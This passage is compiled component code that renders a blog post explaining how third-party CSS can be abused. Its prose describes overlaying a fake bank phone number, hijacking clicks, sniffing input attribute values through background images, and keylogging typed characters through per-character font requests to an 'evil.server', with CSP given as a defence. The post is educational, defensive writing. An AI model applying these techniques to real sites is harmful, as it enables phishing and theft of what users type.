			source10 = claim_element(picture5_nodes, "SOURCE", { type: true, srcset: true });
			source11 = claim_element(picture5_nodes, "SOURCE", { type: true, srcset: true });

			img5 = claim_element(picture5_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture5_nodes.forEach(detach);
			p28_nodes.forEach(detach);
			t115 = claim_space(section8_nodes);
			p29 = claim_element(section8_nodes, "P", {});
			var p29_nodes = children(p29);
			t116 = claim_text(p29_nodes, "A more malicious example would be overlapping a different phone number on top of the hotline number of a bank");
			p29_nodes.forEach(detach);
			t117 = claim_space(section8_nodes);
			pre3 = claim_element(section8_nodes, "PRE", { class: true });
			var pre3_nodes = children(pre3);
			pre3_nodes.forEach(detach);
			t118 = claim_space(section8_nodes);
			p30 = claim_element(section8_nodes, "P", {});
			var p30_nodes = children(p30);
			picture6 = claim_element(p30_nodes, "PICTURE", {});
			var picture6_nodes = children(picture6);
			source12 = claim_element(picture6_nodes, "SOURCE", { type: true, srcset: true });
			source13 = claim_element(picture6_nodes, "SOURCE", { type: true, srcset: true });

			img6 = claim_element(picture6_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture6_nodes.forEach(detach);
			p30_nodes.forEach(detach);
			t119 = claim_space(section8_nodes);
			blockquote = claim_element(section8_nodes, "BLOCKQUOTE", {});
			var blockquote_nodes = children(blockquote);
			p31 = claim_element(blockquote_nodes, "P", {});
			var p31_nodes = children(p31);
			t120 = claim_text(p31_nodes, "The screenshot was taken on my local machine, with a custom setup. No actual harm has done to anyone.");
			p31_nodes.forEach(detach);
			blockquote_nodes.forEach(detach);
			section8_nodes.forEach(detach);
			t121 = claim_space(nodes);
			section9 = claim_element(nodes, "SECTION", {});
			var section9_nodes = children(section9);
			h35 = claim_element(section9_nodes, "H3", {});
			var h35_nodes = children(h35);
			a26 = claim_element(h35_nodes, "A", { href: true, id: true });
			var a26_nodes = children(a26);
			t122 = claim_text(a26_nodes, "Moving content");
			a26_nodes.forEach(detach);
			h35_nodes.forEach(detach);
			t123 = claim_space(section9_nodes);
			p32 = claim_element(section9_nodes, "P", {});
			var p32_nodes = children(p32);
			t124 = claim_text(p32_nodes, "Yet again, we can move the RSVP button around to cover the entire screen. Now clicking anywhere on the site will lead you to the RSVP site.");
			p32_nodes.forEach(detach);
			t125 = claim_space(section9_nodes);
			pre4 = claim_element(section9_nodes, "PRE", { class: true });
			var pre4_nodes = children(pre4);
			pre4_nodes.forEach(detach);
			section9_nodes.forEach(detach);
			t126 = claim_space(nodes);
			section10 = claim_element(nodes, "SECTION", {});
			var section10_nodes = children(section10);
			h36 = claim_element(section10_nodes, "H3", {});
			var h36_nodes = children(h36);
			a27 = claim_element(h36_nodes, "A", { href: true, id: true });
			var a27_nodes = children(a27);
			t127 = claim_text(a27_nodes, "Reading attributes");
			a27_nodes.forEach(detach);
			h36_nodes.forEach(detach);
			t128 = claim_space(section10_nodes);
			p33 = claim_element(section10_nodes, "P", {});
			var p33_nodes = children(p33);
			t129 = claim_text(p33_nodes, "Using the attribute selector, a 3rd party CSS can style the element differently based on different attribute value.");
			p33_nodes.forEach(detach);
			t130 = claim_space(section10_nodes);
			p34 = claim_element(section10_nodes, "P", {});
			var p34_nodes = children(p34);
			t131 = claim_text(p34_nodes, "One, for example, could load a different background image for different attribute value. By knowing which background image is loaded, one could then know the value of the attribute.");
			p34_nodes.forEach(detach);
			t132 = claim_space(section10_nodes);
			p35 = claim_element(section10_nodes, "P", {});
			var p35_nodes = children(p35);
			t133 = claim_text(p35_nodes, "With enough CSS written, covering all possibile values of the attribute, one could possibly figure out or reduce the search space to figure out the attribute value.");
			p35_nodes.forEach(detach);
			t134 = claim_space(section10_nodes);
			p36 = claim_element(section10_nodes, "P", {});
			var p36_nodes = children(p36);
			t135 = claim_text(p36_nodes, "To make matter worse, some framework, for example React, synchornizes ");
			code6 = claim_element(p36_nodes, "CODE", {});
			var code6_nodes = children(code6);
			t136 = claim_text(code6_nodes, "input.value");
			code6_nodes.forEach(detach);
			t137 = claim_text(p36_nodes, " to the ");
			code7 = claim_element(p36_nodes, "CODE", {});
			var code7_nodes = children(code7);
			t138 = claim_text(code7_nodes, "<input value=\"\">");
			code7_nodes.forEach(detach);
			t139 = claim_text(p36_nodes, " attribute.");
			p36_nodes.forEach(detach);
			t140 = claim_space(section10_nodes);

			iframe = claim_element(section10_nodes, "IFRAME", {
				src: true,
				style: true,
				title: true,
				allow: true,
				sandbox: true
			});

			children(iframe).forEach(detach);
			t141 = claim_space(section10_nodes);
			p37 = claim_element(section10_nodes, "P", {});
			var p37_nodes = children(p37);
			t142 = claim_text(p37_nodes, "An example of sniffing the attribute value using attribute selector + ");
			code8 = claim_element(p37_nodes, "CODE", {});
			var code8_nodes = children(code8);
			t143 = claim_text(code8_nodes, "background-image");
			code8_nodes.forEach(detach);
			t144 = claim_text(p37_nodes, ":");
			p37_nodes.forEach(detach);
			t145 = claim_space(section10_nodes);
			pre5 = claim_element(section10_nodes, "PRE", { class: true });
			var pre5_nodes = children(pre5);
			pre5_nodes.forEach(detach);
			section10_nodes.forEach(detach);
			t146 = claim_space(nodes);
			section11 = claim_element(nodes, "SECTION", {});
			var section11_nodes = children(section11);
			h37 = claim_element(section11_nodes, "H3", {});
			var h37_nodes = children(h37);
			a28 = claim_element(h37_nodes, "A", { href: true, id: true });
			var a28_nodes = children(a28);
			t147 = claim_text(a28_nodes, "Monitoring attributes");
			a28_nodes.forEach(detach);
			h37_nodes.forEach(detach);
			t148 = claim_space(section11_nodes);
			p38 = claim_element(section11_nodes, "P", {});
			var p38_nodes = children(p38);
			t149 = claim_text(p38_nodes, "You can track hover and activations of an element and send that information to the server.");
			p38_nodes.forEach(detach);
			t150 = claim_space(section11_nodes);
			pre6 = claim_element(section11_nodes, "PRE", { class: true });
			var pre6_nodes = children(pre6);
			pre6_nodes.forEach(detach);
			section11_nodes.forEach(detach);
			t151 = claim_space(nodes);
			section12 = claim_element(nodes, "SECTION", {});
			var section12_nodes = children(section12);
			h38 = claim_element(section12_nodes, "H3", {});
			var h38_nodes = children(h38);
			a29 = claim_element(h38_nodes, "A", { href: true, id: true });
			var a29_nodes = children(a29);
			t152 = claim_text(a29_nodes, "Reading text");
			a29_nodes.forEach(detach);
			h38_nodes.forEach(detach);
			t153 = claim_space(section12_nodes);
			p39 = claim_element(section12_nodes, "P", {});
			var p39_nodes = children(p39);
			t154 = claim_text(p39_nodes, "If the secret important data on your website is not on the attribute, but rather being part of a text, you may think you are safe from 3rd party CSS, because there's no inner text selector in CSS.");
			p39_nodes.forEach(detach);
			t155 = claim_space(section12_nodes);
			p40 = claim_element(section12_nodes, "P", {});
			var p40_nodes = children(p40);
			t156 = claim_text(p40_nodes, "However, there's still tricks up the 3rd party CSS sleeves: ");
			strong4 = claim_element(p40_nodes, "STRONG", {});
			var strong4_nodes = children(strong4);
			t157 = claim_text(strong4_nodes, "fonts");
			strong4_nodes.forEach(detach);
			t158 = claim_text(p40_nodes, ".");
			p40_nodes.forEach(detach);
			t159 = claim_space(section12_nodes);
			p41 = claim_element(section12_nodes, "P", {});
			var p41_nodes = children(p41);
			t160 = claim_text(p41_nodes, "A 3rd party CSS can declare a ");
			code9 = claim_element(p41_nodes, "CODE", {});
			var code9_nodes = children(code9);
			t161 = claim_text(code9_nodes, "font-family");
			code9_nodes.forEach(detach);
			t162 = claim_text(p41_nodes, " that requires a different font file for different character, which means it could be use to determine what are the characters there is in the selected text.");
			p41_nodes.forEach(detach);
			t163 = claim_space(section12_nodes);
			p42 = claim_element(section12_nodes, "P", {});
			var p42_nodes = children(p42);
			t164 = claim_text(p42_nodes, "However, there's a limitation to this, which is, there's no way telling the order and number of occurence of the characters. Because, the font files would be cached by the browser, and will not be fetched again with another occurence of the same character.");
			p42_nodes.forEach(detach);
			t165 = claim_space(section12_nodes);
			pre7 = claim_element(section12_nodes, "PRE", { class: true });
			var pre7_nodes = children(pre7);
			pre7_nodes.forEach(detach);
			t166 = claim_space(section12_nodes);
			p43 = claim_element(section12_nodes, "P", {});
			var p43_nodes = children(p43);
			t167 = claim_text(p43_nodes, "This could be apply to ");
			code10 = claim_element(p43_nodes, "CODE", {});
			var code10_nodes = children(code10);
			t168 = claim_text(code10_nodes, "<input>");
			code10_nodes.forEach(detach);
			t169 = claim_text(p43_nodes, " as well. As the user types in their confidential information, character by character, the browser fetches the font file, and the ");
			code11 = claim_element(p43_nodes, "CODE", {});
			var code11_nodes = children(code11);
			t170 = claim_text(code11_nodes, "evil.server");
			code11_nodes.forEach(detach);
			t171 = claim_text(p43_nodes, " will know which characters the user has typed into the input.");
			p43_nodes.forEach(detach);
			section12_nodes.forEach(detach);
			t172 = claim_space(nodes);
			section13 = claim_element(nodes, "SECTION", {});
			var section13_nodes = children(section13);
			h23 = claim_element(section13_nodes, "H2", {});
			var h23_nodes = children(h23);
			a30 = claim_element(h23_nodes, "A", { href: true, id: true });
			var a30_nodes = children(a30);
			t173 = claim_text(a30_nodes, "Content Security Policy");
			a30_nodes.forEach(detach);
			h23_nodes.forEach(detach);
			t174 = claim_space(section13_nodes);
			p44 = claim_element(section13_nodes, "P", {});
			var p44_nodes = children(p44);
			t175 = claim_text(p44_nodes, "While I was trying to reading attributes from a local bank website, (to try out the feasibility of the techniques above), I couldn't load the background image from my ");
			code12 = claim_element(p44_nodes, "CODE", {});
			var code12_nodes = children(code12);
			t176 = claim_text(code12_nodes, "localhost");
			code12_nodes.forEach(detach);
			t177 = claim_text(p44_nodes, " server.");
			p44_nodes.forEach(detach);
			t178 = claim_space(section13_nodes);
			p45 = claim_element(section13_nodes, "P", {});
			var p45_nodes = children(p45);
			picture7 = claim_element(p45_nodes, "PICTURE", {});
			var picture7_nodes = children(picture7);
			source14 = claim_element(picture7_nodes, "SOURCE", { type: true, srcset: true });
			source15 = claim_element(picture7_nodes, "SOURCE", { type: true, srcset: true });

			img7 = claim_element(picture7_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture7_nodes.forEach(detach);
			p45_nodes.forEach(detach);
			t179 = claim_space(section13_nodes);
			p46 = claim_element(section13_nodes, "P", {});
			var p46_nodes = children(p46);
			t180 = claim_text(p46_nodes, "It says my request to my image gets blocked by ");
			a31 = claim_element(p46_nodes, "A", { href: true, rel: true });
			var a31_nodes = children(a31);
			t181 = claim_text(a31_nodes, "Content Security Policy");
			a31_nodes.forEach(detach);
			t182 = claim_text(p46_nodes, ".");
			p46_nodes.forEach(detach);
			t183 = claim_space(section13_nodes);
			p47 = claim_element(section13_nodes, "P", {});
			var p47_nodes = children(p47);
			t184 = claim_text(p47_nodes, "So I checked the response of the webpage, and found out the following CSP header in the network tab.");
			p47_nodes.forEach(detach);
			t185 = claim_space(section13_nodes);
			p48 = claim_element(section13_nodes, "P", {});
			var p48_nodes = children(p48);
			picture8 = claim_element(p48_nodes, "PICTURE", {});
			var picture8_nodes = children(picture8);
			source16 = claim_element(picture8_nodes, "SOURCE", { type: true, srcset: true });
			source17 = claim_element(picture8_nodes, "SOURCE", { type: true, srcset: true });

			img8 = claim_element(picture8_nodes, "IMG", {
				title: true,
				alt: true,
				"data-src": true,
				loading: true
			});

			picture8_nodes.forEach(detach);
			p48_nodes.forEach(detach);
			t186 = claim_space(section13_nodes);
			p49 = claim_element(section13_nodes, "P", {});
			var p49_nodes = children(p49);
			t187 = claim_text(p49_nodes, "In the header, it specifies allow-list of domains / subdomains for specific type of asset. For example, in the following CSP");
			p49_nodes.forEach(detach);
			t188 = claim_space(section13_nodes);
			pre8 = claim_element(section13_nodes, "PRE", { class: true });
			var pre8_nodes = children(pre8);
			pre8_nodes.forEach(detach);
			t189 = claim_space(section13_nodes);
			p50 = claim_element(section13_nodes, "P", {});
			var p50_nodes = children(p50);
			t190 = claim_text(p50_nodes, "it allows image source from the site's own origin and subdomain in ");
			code13 = claim_element(p50_nodes, "CODE", {});
			var code13_nodes = children(code13);
			t191 = claim_text(code13_nodes, "gstatic.com");
			code13_nodes.forEach(detach);
			t192 = claim_text(p50_nodes, ", and only styles from the site's own origin.");
			p50_nodes.forEach(detach);
			t193 = claim_space(section13_nodes);
			p51 = claim_element(section13_nodes, "P", {});
			var p51_nodes = children(p51);
			t194 = claim_text(p51_nodes, "Any styles or image source beyond the list will be blocked by the browser.");
			p51_nodes.forEach(detach);
			section13_nodes.forEach(detach);
			t195 = claim_space(nodes);
			section14 = claim_element(nodes, "SECTION", {});
			var section14_nodes = children(section14);
			h24 = claim_element(section14_nodes, "H2", {});
			var h24_nodes = children(h24);
			a32 = claim_element(h24_nodes, "A", { href: true, id: true });
			var a32_nodes = children(a32);
			t196 = claim_text(a32_nodes, "Summary");
			a32_nodes.forEach(detach);
			h24_nodes.forEach(detach);
			t197 = claim_space(section14_nodes);
			p52 = claim_element(section14_nodes, "P", {});
			var p52_nodes = children(p52);
			t198 = claim_text(p52_nodes, "Third party CSS is not absolutely safe, where you can trust them blindly. It can modify, remove or add content to your site, which may indirectly reducing trust of your users to your site.");
			p52_nodes.forEach(detach);
			section14_nodes.forEach(detach);
			t199 = claim_space(nodes);
			section15 = claim_element(nodes, "SECTION", {});
			var section15_nodes = children(section15);
			h25 = claim_element(section15_nodes, "H2", {});
			var h25_nodes = children(h25);
			a33 = claim_element(h25_nodes, "A", { href: true, id: true });
			var a33_nodes = children(a33);
			t200 = claim_text(a33_nodes, "Further reading");
			a33_nodes.forEach(detach);
			h25_nodes.forEach(detach);
			t201 = claim_space(section15_nodes);
			ul3 = claim_element(section15_nodes, "UL", {});
			var ul3_nodes = children(ul3);
			li15 = claim_element(ul3_nodes, "LI", {});
			var li15_nodes = children(li15);
			a34 = claim_element(li15_nodes, "A", { href: true, rel: true });
			var a34_nodes = children(a34);
			t202 = claim_text(a34_nodes, "https://jakearchibald.com/2018/third-party-css-is-not-safe/");
			a34_nodes.forEach(detach);
			li15_nodes.forEach(detach);
			t203 = claim_space(ul3_nodes);
			li16 = claim_element(ul3_nodes, "LI", {});
			var li16_nodes = children(li16);
			a35 = claim_element(li16_nodes, "A", { href: true, rel: true });
			var a35_nodes = children(a35);
			t204 = claim_text(a35_nodes, "https://github.com/maxchehab/CSS-Keylogging");
			a35_nodes.forEach(detach);
			li16_nodes.forEach(detach);
			t205 = claim_space(ul3_nodes);
			li17 = claim_element(ul3_nodes, "LI", {});
			var li17_nodes = children(li17);
			a36 = claim_element(li17_nodes, "A", { href: true, rel: true });
			var a36_nodes = children(a36);
			t206 = claim_text(a36_nodes, "https://vimeo.com/100264064#t=1290s");
			a36_nodes.forEach(detach);
			li17_nodes.forEach(detach);
			t207 = claim_space(ul3_nodes);
			li18 = claim_element(ul3_nodes, "LI", {});
			var li18_nodes = children(li18);
			a37 = claim_element(li18_nodes, "A", { href: true, rel: true });
			var a37_nodes = children(a37);
			t208 = claim_text(a37_nodes, "https://www.youtube.com/watch?v=eb3suf4REyI");
			a37_nodes.forEach(detach);
			li18_nodes.forEach(detach);
			t209 = claim_space(ul3_nodes);
			li19 = claim_element(ul3_nodes, "LI", {});
			var li19_nodes = children(li19);
			a38 = claim_element(li19_nodes, "A", { href: true, rel: true });
			var a38_nodes = children(a38);
			t210 = claim_text(a38_nodes, "https://www.nds.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf");
			a38_nodes.forEach(detach);
			li19_nodes.forEach(detach);
			ul3_nodes.forEach(detach);
			section15_nodes.forEach(detach);
			this.h();
		},
		h() {
			attr(a0, "href", "#rd-party");
			attr(a1, "href", "#where-does-rd-party-css-come-from");
			attr(a2, "href", "#css-frameworks");
			attr(a3, "href", "#third-party-scripts");
			attr(a4, "href", "#browser-extensions");
			attr(a5, "href", "#how-rd-party-css-can-be-unsafe");
			attr(a6, "href", "#disappearing-content");
			attr(a7, "href", "#adding-content");
			attr(a8, "href", "#moving-content");
			attr(a9, "href", "#reading-attributes");
			attr(a10, "href", "#monitoring-attributes");
			attr(a11, "href", "#reading-text");
			attr(a12, "href", "#content-security-policy");
			attr(a13, "href", "#summary");
			attr(a14, "href", "#further-reading");
			attr(ul2, "class", "sitemap");
			attr(ul2, "id", "sitemap");
			attr(ul2, "role", "navigation");
			attr(ul2, "aria-label", "Table of Contents");
			attr(a15, "href", "https://jakearchibald.com/2018/third-party-css-is-not-safe/");
			attr(a15, "rel", "nofollow");
			attr(a16, "href", "#rd-party");
			attr(a16, "id", "rd-party");
			attr(a17, "href", "#where-does-rd-party-css-come-from");
			attr(a17, "id", "where-does-rd-party-css-come-from");
			attr(a18, "href", "#css-frameworks");
			attr(a18, "id", "css-frameworks");
			attr(source0, "type", "image/webp");
			attr(source0, "srcset", __build_img_webp__0);
			attr(source1, "type", "image/jpeg");
			attr(source1, "srcset", __build_img__0);
			attr(img0, "title", "null");
			attr(img0, "alt", "bootstrap cdn");
			attr(img0, "data-src", __build_img__0);
			attr(img0, "loading", "lazy");
			attr(a19, "href", "#third-party-scripts");
			attr(a19, "id", "third-party-scripts");
			attr(a20, "href", "https://shopee.sg/");
			attr(a20, "rel", "nofollow");
			attr(source2, "type", "image/webp");
			attr(source2, "srcset", __build_img_webp__1);
			attr(source3, "type", "image/jpeg");
			attr(source3, "srcset", __build_img__1);
			attr(img1, "title", "null");
			attr(img1, "alt", "ads in shopee");
			attr(img1, "data-src", __build_img__1);
			attr(img1, "loading", "lazy");
			attr(a21, "href", "#browser-extensions");
			attr(a21, "id", "browser-extensions");
			attr(source4, "type", "image/webp");
			attr(source4, "srcset", __build_img_webp__2);
			attr(source5, "type", "image/jpeg");
			attr(source5, "srcset", __build_img__2);
			attr(img2, "title", "null");
			attr(img2, "alt", "browser extension");
			attr(img2, "data-src", __build_img__2);
			attr(img2, "loading", "lazy");
			attr(a22, "href", "#how-rd-party-css-can-be-unsafe");
			attr(a22, "id", "how-rd-party-css-can-be-unsafe");
			attr(a23, "href", "#disappearing-content");
			attr(a23, "id", "disappearing-content");
			attr(a24, "href", "https://singaporecss.github.io/");
			attr(a24, "rel", "nofollow");
			attr(pre0, "class", "language-css");
			attr(source6, "type", "image/webp");
			attr(source6, "srcset", __build_img_webp__3);
			attr(source7, "type", "image/jpeg");
			attr(source7, "srcset", __build_img__3);
			attr(img3, "title", "null");
			attr(img3, "alt", "disappearing content");
			attr(img3, "data-src", __build_img__3);
			attr(img3, "loading", "lazy");
			attr(a25, "href", "#adding-content");
			attr(a25, "id", "adding-content");
			attr(pre1, "class", "language-css");
			attr(source8, "type", "image/webp");
			attr(source8, "srcset", __build_img_webp__4);
			attr(source9, "type", "image/jpeg");
			attr(source9, "srcset", __build_img__4);
			attr(img4, "title", "null");
			attr(img4, "alt", "adding content");
			attr(img4, "data-src", __build_img__4);
			attr(img4, "loading", "lazy");
			attr(pre2, "class", "language-css");
			attr(source10, "type", "image/webp");
			attr(source10, "srcset", __build_img_webp__5);
			attr(source11, "type", "image/jpeg");
			attr(source11, "srcset", __build_img__5);
			attr(img5, "title", "null");
			attr(img5, "alt", "adding content 2");
			attr(img5, "data-src", __build_img__5);
			attr(img5, "loading", "lazy");
			attr(pre3, "class", "language-css");
			attr(source12, "type", "image/webp");
			attr(source12, "srcset", __build_img_webp__6);
			attr(source13, "type", "image/jpeg");
			attr(source13, "srcset", __build_img__6);
			attr(img6, "title", "null");
			attr(img6, "alt", "adding content 3");
			attr(img6, "data-src", __build_img__6);
			attr(img6, "loading", "lazy");
			attr(a26, "href", "#moving-content");
			attr(a26, "id", "moving-content");
			attr(pre4, "class", "language-css");
			attr(a27, "href", "#reading-attributes");
			attr(a27, "id", "reading-attributes");
			if (iframe.src !== (iframe_src_value = "https://codesandbox.io/embed/simple-password-ty7b7?fontsize=14&hidenavigation=1&theme=dark")) attr(iframe, "src", iframe_src_value);
			set_style(iframe, "width", "100%");
			set_style(iframe, "height", "500px");
			set_style(iframe, "border", "0");
			set_style(iframe, "border-radius", "4px");
			set_style(iframe, "overflow", "hidden");
			attr(iframe, "title", "Simple password");
			attr(iframe, "allow", "accelerometer; ambient-light-sensor; camera; encrypted-media; geolocation; gyroscope; hid; microphone; midi; payment; usb; vr; xr-spatial-tracking");
			attr(iframe, "sandbox", "allow-forms allow-modals allow-popups allow-presentation allow-same-origin allow-scripts");
			attr(pre5, "class", "language-css");
			attr(a28, "href", "#monitoring-attributes");
			attr(a28, "id", "monitoring-attributes");
			attr(pre6, "class", "language-css");
			attr(a29, "href", "#reading-text");
			attr(a29, "id", "reading-text");
			attr(pre7, "class", "language-css");
			attr(a30, "href", "#content-security-policy");
			attr(a30, "id", "content-security-policy");
			attr(source14, "type", "image/webp");
			attr(source14, "srcset", __build_img_webp__7);
			attr(source15, "type", "image/jpeg");
			attr(source15, "srcset", __build_img__7);
			attr(img7, "title", "null");
			attr(img7, "alt", "content security policy");
			attr(img7, "data-src", __build_img__7);
			attr(img7, "loading", "lazy");
			attr(a31, "href", "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP");
			attr(a31, "rel", "nofollow");
			attr(source16, "type", "image/webp");
			attr(source16, "srcset", __build_img_webp__8);
			attr(source17, "type", "image/jpeg");
			attr(source17, "srcset", __build_img__8);
			attr(img8, "title", "null");
			attr(img8, "alt", "content security policy");
			attr(img8, "data-src", __build_img__8);
			attr(img8, "loading", "lazy");
			attr(pre8, "class", "language-null");
			attr(a32, "href", "#summary");
			attr(a32, "id", "summary");
			attr(a33, "href", "#further-reading");
			attr(a33, "id", "further-reading");
			attr(a34, "href", "https://jakearchibald.com/2018/third-party-css-is-not-safe/");
			attr(a34, "rel", "nofollow");
			attr(a35, "href", "https://github.com/maxchehab/CSS-Keylogging");
			attr(a35, "rel", "nofollow");
			attr(a36, "href", "https://vimeo.com/100264064#t=1290s");
			attr(a36, "rel", "nofollow");
			attr(a37, "href", "https://www.youtube.com/watch?v=eb3suf4REyI");
			attr(a37, "rel", "nofollow");
			attr(a38, "href", "https://www.nds.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf");
			attr(a38, "rel", "nofollow");
		},
		m(target, anchor) {
			insert(target, section0, anchor);
			append(section0, ul2);
			append(ul2, li0);
			append(li0, a0);
			append(a0, t0);
			append(ul2, li1);
			append(li1, a1);
			append(a1, t1);
			append(ul2, ul0);
			append(ul0, li2);
			append(li2, a2);
			append(a2, t2);
			append(ul0, li3);
			append(li3, a3);
			append(a3, t3);
			append(ul0, li4);
			append(li4, a4);
			append(a4, t4);
			append(ul2, li5);
			append(li5, a5);
			append(a5, t5);
			append(ul2, ul1);
			append(ul1, li6);
			append(li6, a6);
			append(a6, t6);
			append(ul1, li7);
			append(li7, a7);
			append(a7, t7);
			append(ul1, li8);
			append(li8, a8);
			append(a8, t8);
			append(ul1, li9);
			append(li9, a9);
			append(a9, t9);
			append(ul1, li10);
			append(li10, a10);
			append(a10, t10);
			append(ul1, li11);
			append(li11, a11);
			append(a11, t11);
			append(ul2, li12);
			append(li12, a12);
			append(a12, t12);
			append(ul2, li13);
			append(li13, a13);
			append(a13, t13);
			append(ul2, li14);
			append(li14, a14);
			append(a14, t14);
			insert(target, t15, anchor);
			insert(target, p0, anchor);
			append(p0, t16);
			append(p0, a15);
			append(a15, t17);
			append(p0, t18);
			insert(target, t19, anchor);
			insert(target, section1, anchor);
			append(section1, h20);
			append(h20, a16);
			append(a16, t20);
			append(section1, t21);
			append(section1, p1);
			append(p1, t22);
			append(section1, t23);
			append(section1, p2);
			append(p2, t24);
			append(section1, t25);
			append(section1, p3);
			append(p3, t26);
			insert(target, t27, anchor);
			insert(target, section2, anchor);
			append(section2, h21);
			append(h21, a17);
			append(a17, t28);
			append(section2, t29);
			append(section2, p4);
			append(p4, t30);
			insert(target, t31, anchor);
			insert(target, section3, anchor);
			append(section3, h30);
			append(h30, a18);
			append(a18, t32);
			append(section3, t33);
			append(section3, p5);
			append(p5, t34);
			append(section3, t35);
			append(section3, p6);
			append(p6, picture0);
			append(picture0, source0);
			append(picture0, source1);
			append(picture0, img0);
			append(section3, t36);
			append(section3, p7);
			append(p7, t37);
			append(section3, t38);
			append(section3, p8);
			append(p8, em0);
			append(em0, t39);
			append(em0, code0);
			append(code0, t40);
			append(em0, t41);
			insert(target, t42, anchor);
			insert(target, section4, anchor);
			append(section4, h31);
			append(h31, a19);
			append(a19, t43);
			append(section4, t44);
			append(section4, p9);
			append(p9, t45);
			append(section4, t46);
			append(section4, p10);
			append(p10, t47);
			append(section4, t48);
			append(section4, p11);
			append(p11, t49);
			append(p11, strong0);
			append(strong0, t50);
			append(p11, t51);
			append(p11, em1);
			append(em1, t52);
			append(p11, t53);
			append(section4, t54);
			append(section4, p12);
			append(p12, t55);
			append(p12, a20);
			append(a20, t56);
			append(p12, t57);
			append(section4, t58);
			append(section4, p13);
			append(p13, picture1);
			append(picture1, source2);
			append(picture1, source3);
			append(picture1, img1);
			append(section4, t59);
			append(section4, p14);
			append(p14, strong1);
			append(strong1, t60);
			append(p14, t61);
			append(p14, em2);
			append(em2, t62);
			append(p14, t63);
			insert(target, t64, anchor);
			insert(target, section5, anchor);
			append(section5, h32);
			append(h32, a21);
			append(a21, t65);
			append(section5, t66);
			append(section5, p15);
			append(p15, t67);
			append(section5, t68);
			append(section5, p16);
			append(p16, picture2);
			append(picture2, source4);
			append(picture2, source5);
			append(picture2, img2);
			append(section5, t69);
			append(section5, p17);
			append(p17, t70);
			insert(target, t71, anchor);
			insert(target, section6, anchor);
			append(section6, h22);
			append(h22, a22);
			append(a22, t72);
			append(section6, t73);
			append(section6, p18);
			append(p18, t74);
			insert(target, t75, anchor);
			insert(target, section7, anchor);
			append(section7, h33);
			append(h33, a23);
			append(a23, t76);
			append(section7, t77);
			append(section7, p19);
			append(p19, t78);
			append(p19, code1);
			append(code1, t79);
			append(p19, t80);
			append(section7, t81);
			append(section7, p20);
			append(p20, t82);
			append(p20, a24);
			append(a24, t83);
			append(p20, t84);
			append(section7, t85);
			append(section7, pre0);
			pre0.innerHTML = raw0_value;
			append(section7, t86);
			append(section7, p21);
			append(p21, picture3);
			append(picture3, source6);
			append(picture3, source7);
			append(picture3, img3);
			insert(target, t87, anchor);
			insert(target, section8, anchor);
			append(section8, h34);
			append(h34, a25);
			append(a25, t88);
			append(section8, t89);
			append(section8, p22);
			append(p22, t90);
			append(section8, t91);
			append(section8, p23);
			append(p23, t92);
			append(p23, code2);
			append(code2, t93);
			append(p23, t94);
			append(section8, t95);
			append(section8, pre1);
			pre1.innerHTML = raw1_value;
			append(section8, t96);
			append(section8, p24);
			append(p24, picture4);
			append(picture4, source8);
			append(picture4, source9);
			append(picture4, img4);
			append(section8, t97);
			append(section8, p25);
			append(p25, t98);
			append(p25, code3);
			append(code3, t99);
			append(p25, t100);
			append(p25, code4);
			append(code4, t101);
			append(p25, t102);
			append(p25, code5);
			append(code5, t103);
			append(p25, t104);
			append(section8, t105);
			append(section8, p26);
			append(p26, t106);
			append(section8, t107);
			append(section8, pre2);
			pre2.innerHTML = raw2_value;
			append(section8, t108);
			append(section8, p27);
			append(p27, t109);
			append(p27, strong2);
			append(strong2, t110);
			append(p27, t111);
			append(p27, strong3);
			append(strong3, t112);
			append(p27, t113);
			append(section8, t114);
			append(section8, p28);
			append(p28, picture5);
			append(picture5, source10);
			append(picture5, source11);
			append(picture5, img5);
			append(section8, t115);
			append(section8, p29);
			append(p29, t116);
			append(section8, t117);
			append(section8, pre3);
			pre3.innerHTML = raw3_value;
			append(section8, t118);
			append(section8, p30);
			append(p30, picture6);
			append(picture6, source12);
			append(picture6, source13);
			append(picture6, img6);
			append(section8, t119);
			append(section8, blockquote);
			append(blockquote, p31);
			append(p31, t120);
			insert(target, t121, anchor);
			insert(target, section9, anchor);
			append(section9, h35);
			append(h35, a26);
			append(a26, t122);
			append(section9, t123);
			append(section9, p32);
			append(p32, t124);
			append(section9, t125);
			append(section9, pre4);
			pre4.innerHTML = raw4_value;
			insert(target, t126, anchor);
			insert(target, section10, anchor);
			append(section10, h36);
			append(h36, a27);
			append(a27, t127);
			append(section10, t128);
			append(section10, p33);
			append(p33, t129);
			append(section10, t130);
			append(section10, p34);
			append(p34, t131);
			append(section10, t132);
			append(section10, p35);
			append(p35, t133);
			append(section10, t134);
			append(section10, p36);
			append(p36, t135);
			append(p36, code6);
			append(code6, t136);
			append(p36, t137);
			append(p36, code7);
			append(code7, t138);
			append(p36, t139);
			append(section10, t140);
			append(section10, iframe);
			append(section10, t141);
			append(section10, p37);
			append(p37, t142);
			append(p37, code8);
			append(code8, t143);
			append(p37, t144);
			append(section10, t145);
			append(section10, pre5);
			pre5.innerHTML = raw5_value;
			insert(target, t146, anchor);
			insert(target, section11, anchor);
			append(section11, h37);
			append(h37, a28);
			append(a28, t147);
			append(section11, t148);
			append(section11, p38);
			append(p38, t149);
			append(section11, t150);
			append(section11, pre6);
			pre6.innerHTML = raw6_value;
			insert(target, t151, anchor);
			insert(target, section12, anchor);
			append(section12, h38);
			append(h38, a29);
			append(a29, t152);
			append(section12, t153);
			append(section12, p39);
			append(p39, t154);
			append(section12, t155);
			append(section12, p40);
			append(p40, t156);
			append(p40, strong4);
			append(strong4, t157);
			append(p40, t158);
			append(section12, t159);
			append(section12, p41);
			append(p41, t160);
			append(p41, code9);
			append(code9, t161);
			append(p41, t162);
			append(section12, t163);
			append(section12, p42);
			append(p42, t164);
			append(section12, t165);
			append(section12, pre7);
			pre7.innerHTML = raw7_value;
			append(section12, t166);
			append(section12, p43);
			append(p43, t167);
			append(p43, code10);
			append(code10, t168);
			append(p43, t169);
			append(p43, code11);
			append(code11, t170);
			append(p43, t171);
			insert(target, t172, anchor);
			insert(target, section13, anchor);
			append(section13, h23);
